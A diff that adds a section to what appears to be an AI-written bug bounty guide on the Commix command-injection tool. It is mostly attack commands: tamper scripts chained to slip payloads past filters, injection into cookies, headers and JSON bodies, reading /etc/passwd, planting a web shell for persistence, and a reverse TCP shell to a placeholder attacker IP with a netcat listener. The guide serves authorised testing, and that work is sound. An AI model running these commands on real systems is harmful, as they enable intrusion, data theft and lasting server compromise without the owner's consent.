@@ -116,5 +116,122 @@ Knowing where to look will save you a lot of time. These are common patterns fro
 *   **Log viewers:** That use `tail -f` or `grep` on user input.
 *   **Backup/Restore functions:** That use `tar`, `zip`, or `unzip` with user-controlled filenames.
 *   **Any function that interacts with the OS:** Like sending emails, converting files, or generating reports.
+  Here are some more advanced core examples for taking your Commix usage to the next level in a bug bounty context, particularly focusing on precision and bypass techniques.
+
+### 🎯 Advanced Targeting and Precision
+
+These flags help you test specific parameters or control how Commix conducts the test.
+
+#### 1. The `-p` Flag: Target a Specific Parameter
+
+Instead of letting Commix test all parameters, you can pinpoint exactly which one to inject into using the `-p` flag. This is much faster and reduces noise.
+```bash
+commix --url="http://target.com/ping.php?ip=127.0.0.1&debug=0" -p ip
+```
+This tells Commix to only test the `ip` parameter for command injection.
+
+#### 2. The `--technique` Flag: Control the Test
+
+By default, Commix tests all four injection techniques (classic, eval-based, time-based, file-based) . Use `--technique` to focus on a specific one. This is useful for blind injection scenarios where you can only reliably detect a time delay.
+```bash
+commix --url="http://target.com/ping.php?ip=127.0.0.1" --technique=time
+```
+You can also use `--skip-technique` to exclude a method .
+
+#### 3. Verbose Mode (`-v`): See the Details
+
+When a test isn't behaving as expected, increasing the verbosity helps you understand what Commix is doing.
+*   `-v 1`: Shows simple debugging info.
+*   `-v 2`: Shows all HTTP requests being sent .
+*   `-v 3`: Shows HTTP request and response headers .
+*   `-v 4`: Shows the full request and response bodies, useful for deep debugging .
+
+```bash
+commix --url="http://target.com/ping.php?ip=127.0.0.1" -v 2
+```
+This is invaluable for crafting custom bypasses.
+
+### 🛡️ WAF Bypass and Payload Obfuscation
+
+This is where Commix shines. You can use tamper scripts to defeat input filters.
+
+#### 1. Listing Available Tamper Scripts
+
+To see what's available:
+```bash
+ls $(python3 -c "import commix; print(commix.__path__[0])")/tamper/ 2>/dev/null
+```
+For a git clone, the path would be `commix/src/tamper/` .
+
+#### 2. Chaining Tamper Scripts
+
+To evade complex filters, you can chain multiple tamper scripts. Commix will apply them in order.
+```bash
+commix --url="http://target.com/ping.php?ip=127.0.0.1" --tamper="space2ifs,uninitializedvariable"
+```
+This will first replace spaces with `${IFS}` and then add uninitialized variables to keywords like `whoami` (e.g., `w${AB}hoami`), bypassing both space and keyword filters .
+
+#### 3. Other Useful Tamper Scripts
+
+*   `backslashes`: Adds backslashes before each character in the payload (e.g., `whoami` -> `w\h\o\a\m\i`) .
+*   `hexencode`: Hex-encodes the entire payload .
+*   `base64encode`: Base64-encodes the payload .
+*   `rev.py`: Reverses the command character-wise (e.g., `whoami` -> `imaohw`) .
+
+#### 4. Testing HTTP Headers, Cookies, JSON, and XML
+
+Commix isn't limited to URL parameters or standard POST data. It can test many different contexts.
+
+*   **Testing a Cookie:** 
+    ```bash
+    commix -u "http://target.com/index.php" --cookie="session=INJECT_HERE"
+    ```
+
+*   **Testing a JSON Body:** 
+    ```bash
+    commix -u "http://target.com/api" --data='{"cmd":"ping"}' -p cmd
+    ```
+
+*   **Testing an XML Body:** 
+    ```bash
+    commix -u "http://target.com/api" --data='<?xml><cmd>ping</cmd></xml>'
+    ```
+
+*   **Testing a Custom Header:** 
+    ```bash
+    commix -u "http://target.com/index.php?id=1" --headers="X-User: INJECT_HERE"
+    ```
+
+### 📂 File System Interaction and Exploitation
+
+After confirming a vulnerability, you can read, write, or get a reverse shell.
+
+#### 1. Writing a File to the Server
+
+This is an excellent way to gain a persistent foothold by uploading a web shell.
+First, create a local file (e.g., `webshell.php`), then use `--file-write` and `--file-dest` .
+```bash
+commix -r req.txt --batch --file-write=webshell.php --file-dest=/var/www/html/webshell.php
+```
+
+#### 2. Getting a Reverse Shell
+
+If `--os-shell` isn't working perfectly or you want a more stable interactive shell, you can use the reverse TCP option .
+```bash
+commix --url="http://target.com/page?id=1" --reverse-tcp="YOUR_IP:4444"
+```
+Make sure you have a netcat listener running on your machine first (`nc -lvnp 4444`).
+
+### 💡 Bug Bounty Workflow
+
+1.  **Initial Recon:** Identify interesting parameters (especially in `ping`, `trace`, `exec`, `backup`, `mail`, `convert` functions).
+2.  **Quick Scan:** Use `--batch` for a quick first pass.
+3.  **Head-Hunting:** If you suspect a specific header or cookie is vulnerable, test it directly using `--cookie` or `--headers`.
+4.  **Evade Filters:** If you get a detection, start chaining tamper scripts (`--tamper`). Many bug bounty reports start with a basic injection and escalate to a shell using tamper scripts .
+5.  **Prove Impact:**
+    *   **Low:** `--os-cmd="whoami"` .
+    *   **Medium:** `--file-read="/etc/passwd"` .
+    *   **High:** `--os-shell` or `--reverse-tcp` to get interactive access .
+    *   **Critical:** `--file-write` to upload a web shell and gain persistence .
 
 Good luck with your bug bounty hunting! Let me know if you run into a specific filter or scenario you need help with.
